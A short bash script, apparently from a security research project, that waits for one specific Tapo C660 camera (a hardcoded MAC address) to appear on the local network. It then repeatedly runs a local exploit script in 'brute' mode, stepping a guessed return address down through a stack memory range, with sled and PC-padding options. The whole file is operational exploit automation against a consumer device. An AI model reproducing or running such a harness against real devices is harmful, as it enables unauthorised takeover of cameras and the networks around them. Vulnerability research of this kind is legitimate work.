#!/bin/bash
# C660 sweep: waits for 50:3D:D1:2F:49:B9 in ARP, then walks the main-stack region.
cd /Users/jemanuel/projects/franken_surveillance_system
STATE=/tmp/c660_sweep.state
[ -s "$STATE" ] && ADDR=$(cat "$STATE") || ADDR=0xbef80000
END=0xb6f00000
LOG=/tmp/c660_sweep.log
while true; do
  IP=$(sudo -n /usr/sbin/arp -an 2>/dev/null | awk -v m="50:3d:d1:2f:49:b9" '
    { gsub(/[()]/, "", $2); mac=tolower($4); n=split(mac,o,":"); out="";
      for(i=1;i<=n;i++) out=out (i>1?":":"") (o[i]+0);
      if (out==m) { print $2; exit } }')
  [ -z "$IP" ] && { sleep 60; continue; }
  sudo -n python3 deliverables/scripts/tapo_connectap_sc.py brute --host $IP \
    --offset 1060 --sled 0 --padpc 1 --sledfill --pcround 0x1000 \
    --addr $ADDR --count 512 --step 0x400 --hang --mac 50:3D:D1:2F:49:B9 >> "$LOG" 2>&1
  echo "$IP addr=$ADDR rc=$? $(date +%H:%M:%S)" >> "$LOG"
  ADDR=$(printf "0x%x" $(( $ADDR - 512*0x400 )))
  [ $(( $ADDR )) -le $(( $END )) ] && break
done
